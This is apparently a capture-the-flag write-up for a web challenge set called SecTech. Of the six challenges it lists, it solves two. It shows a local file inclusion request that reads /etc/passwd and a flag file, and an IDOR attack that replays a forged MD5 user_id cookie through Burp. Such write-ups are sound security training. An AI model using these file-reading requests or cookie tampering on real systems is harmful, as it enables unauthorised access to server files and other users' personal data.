# SecTech (6 challenges)

### Summary
1. LFI -> Flag
2. IDOR -> Flag
3. Insecure Deserialization -> Flag
4. XSS in PDF Generator -> Flag
5. SSRF to AWS Metadata -> Flag
6. Misconfigured S3 Bucket -> OSINT of Github Account -> Sensitive Information Disclosure in Git Commits -> Flag

# GovTech SecTech (1/6) - LFI
### Description
WhiteHacks SecTech is an application for SecTech school staff to login to the system and to view students grades and to generate transcripts. However, could you perhaps view more than transcripts?
### Solution

Notice in the 'View Transcript' functionality - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript.html

There is a 'file' parameter, these types of parameters are usually vulnerable to Local File Inclusion

We can dump the /etc/passwd file - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/etc/passwd

``````
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List 
Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time 
Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd 
Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin 
geoclue:x:106:111::/var/lib/geoclue:/usr/sbin/nologin admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt 
``````
Notice the last line?
``````
admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt 
``````
Let's visit that - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/secret_path/lfi_flag.txt 

Flag:
WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}

# GovTech SecTech (2/6) - IDOR
### Description
Insecure Direct Object Reference can have severe repercussions for applications. One mitigation technique is to avoid trusting user input. If you are tired, have some cookies with milk?
### Solution

When we visit anywhere in the webpage we notice in Burp Intruder,
``````
GET /profile.php HTTP/1.1
Host: sec-tech.cf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id=c4ca4238a0b923820dcc509a6f75849b
Upgrade-Insecure-Requests: 1
``````
IDOR (Insecure Direct Object Reference) is a easy-to-find yet serious vulnerability affecting web applications. This occurs when user-controlled input is used to access objects in applications

Notice that the user_id in the Cookie: header is a MD5 hash. We can try and search up that hash online - https://md5.gromweb.com/?md5=c4ca4238a0b923820dcc509a6f75849b

``````
The MD5 hash:
c4ca4238a0b923820dcc509a6f75849b
was succesfully reversed into the string:
1
``````
Therefore the we can modify the user_id parameter to a different number - https://www.md5hashgenerator.com/
``````
Your Hash: c81e728d9d4c2f636f067f89cc14862c
Your String: 2
``````
And send it in Burp to profile.php
``````
GET /profile.php HTTP/1.1
Host: sec-tech.cf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
Upgrade-Insecure-Requests: 1
``````
In Burp Suite, we can view the table
``````
Item 	Value
Name 	Billie Jean
Role 	Perm Staff
Date of Birth 	1st July 1988
Email 	billie_jean@sectech.com.sg
Flag 	WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
``````

Flag:
WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
